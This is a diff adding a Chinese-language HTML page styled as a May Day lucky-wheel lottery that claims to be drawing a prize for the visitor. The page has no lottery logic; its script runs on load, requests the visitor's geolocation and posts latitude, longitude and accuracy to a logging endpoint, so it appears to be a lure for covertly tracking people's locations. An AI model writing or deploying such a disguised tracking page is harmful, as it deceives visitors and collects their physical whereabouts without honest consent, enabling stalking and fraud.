@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <title>幸运大转盘 | 抽奖活动</title>
+  <style>
+    body {
+      background: linear-gradient(to bottom right, #ffe8a3, #ffd1dc);
+      font-family: "Helvetica Neue", sans-serif;
+      text-align: center;
+      padding: 40px;
+    }
+    .wheel {
+      width: 200px;
+      height: 200px;
+      margin: 40px auto;
+      border: 10px solid #f39c12;
+      border-radius: 50%;
+      background: conic-gradient(#f1c40f 0% 25%, #e74c3c 25% 50%, #2ecc71 50% 75%, #3498db 75% 100%);
+      animation: spin 3s ease-out infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(1080deg); }
+    }
+    .text {
+      font-size: 22px;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h1>🎉 恭喜您参与「五一抽奖活动」</h1>
+  <div class="wheel"></div>
+  <div class="text">系统正在为您抽取大奖...</div>
+
+  <script>
+    window.onload = function () {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          const data = {
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude,
+            accuracy: pos.coords.accuracy
+          };
+
+          fetch('/api/log', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+          }).then(() => console.log("📍 位置已发送"));
+        }, err => {
+          console.warn("❌ 获取定位失败：", err);
+        });
+      } else {
+        console.warn("❌ 浏览器不支持定位");
+      }
+    };
+  </script>
+</body>
+</html>
